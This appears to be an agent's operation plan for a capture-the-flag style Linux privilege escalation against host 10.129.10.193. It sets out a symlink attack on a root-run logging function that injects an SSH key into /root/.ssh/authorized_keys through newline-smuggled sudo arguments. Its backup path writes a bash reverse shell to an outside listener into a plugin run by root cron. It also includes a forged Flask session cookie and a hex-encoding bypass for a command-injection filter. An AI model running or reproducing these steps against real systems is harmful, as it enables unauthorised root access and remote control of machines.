scope.objective: Escalate to root via syswatch.sh log_message symlink attack. Read /root/root.txt.
in_scope: Command injection as syswatch via forged Flask session on localhost:7777 (cookie in exploit_log.md Session 3)
Running sudo /opt/syswatch/syswatch.sh plugin with crafted arguments as dev_ryan
SSH as root after key injection
scope.out_of_scope: Do not modify existing plugins or scripts. Do not disrupt running services. Do not delete existing log files permanently (recreate after attack if needed).
stop_conditions: Both primary and backup paths exhausted

primary_path: SSH key injection via syswatch.sh log_message symlink — immediate root. Step 1: Via command injection as syswatch (use forged Flask session from Session 3, pipe+xxd hex bypass), create symlink: rm -f /opt/syswatch/logs/system.log && ln -s /root/.ssh/authorized_keys /opt/syswatch/logs/system.log. Step 2: As dev_ryan via SSH, run: sudo /opt/syswatch/syswatch.sh plugin log_monitor.sh $'\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINSNEXBZDJ0S5FvZhgWAho9R6Jcj1Uyuyp8eAxRtPFlf devarea-op\n'. The syswatch.sh log_message function appends to $LOG_DIR/system.log (symlinked to authorized_keys) as root WITHOUT symlink checks. The SSH key ends up on its own line — SSH ignores the junk log prefix line. Step 3: ssh -i ../shared/raw/devarea_key root@10.129.10.193. Step 4: cat /root/root.txt.
backup_path: Plugin injection via symlink — root shell in ≤5 minutes. If /root/.ssh/ doesn't exist or authorized_keys injection fails: Step 1: As syswatch, create symlink: ln -s /opt/syswatch/plugins/privesc.sh /opt/syswatch/logs/system.log. Step 2: As dev_ryan: sudo /opt/syswatch/syswatch.sh plugin log_monitor.sh $'\nbash -i >& /dev/tcp/10.10.14.91/9003 0>&1\n'. This writes a reverse shell command into plugins/privesc.sh. Line 1 (log timestamp) fails harmlessly, line 2+ executes. Step 3: Start listener on attack box port 9003. Step 4: Wait for monitor.sh timer (runs every 5 min as root) to execute plugins/privesc.sh. Alternatively, re-symlink system.log to authorized_keys and retry with mkdir -p in the payload.

vulnerability_primitive.primitive: syswatch.sh log_message() writes to $LOG_DIR/system.log as root via >> without checking for symlinks. Attacker controls symlink target (syswatch owns logs/) and partial content ($* args are unvalidated in log_message call).
delivery_forms: Symlink system.log → /root/.ssh/authorized_keys + SSH pubkey in plugin args
Symlink system.log → /opt/syswatch/plugins/evil.sh + reverse shell in plugin args
Symlink system.log → /etc/cron.d/root-shell + cron format payload in args
Newline injection in $* to put payload on its own line (SSH ignores bad lines, bash skips erroring lines)
vulnerability_primitive.defenses_observed: common.sh log_message HAS symlink protection (rm + recreate). syswatch.sh log_message does NOT. Plugin name validated by SAFE_PLUGIN_REGEX but extra args ($*) are unvalidated. fs.protected_symlinks=1 but only affects sticky-bit dirs — logs/ is not sticky.
untested_forms: All forms — first exploitation attempt on this vector

process_model.foreground: SSH session as dev_ryan for cmd injection and sudo commands
process_model.background: nc listener on port 9003 if using backup path (plugin injection)
process_model.critical_note: The symlink must be created BEFORE running sudo syswatch.sh. The log_message fires before plugin execution in execute_plugin(). If /root/.ssh/authorized_keys doesn't exist but /root/.ssh/ does, >> creates it. If /root/.ssh/ doesn't exist, >> fails — fall back to backup path.

notes: PRIOR STATE from Session 3: Flask session cookie is eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.acgt5A.vXOmynCQ68XnMlJBYHRQrNzgl30. Command injection regex blocks ;/\&.<>\r and uppercase — use pipe + xxd hex decode as before. SSH public key for injection: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINSNEXBZDJ0S5FvZhgWAho9R6Jcj1Uyuyp8eAxRtPFlf devarea-op (private key at ../shared/raw/devarea_key). 19 turns remaining from ELLIOT's Session 3 budget — combined budget now 20. After getting root, clean up: rm symlink, restore system.log as regular file.
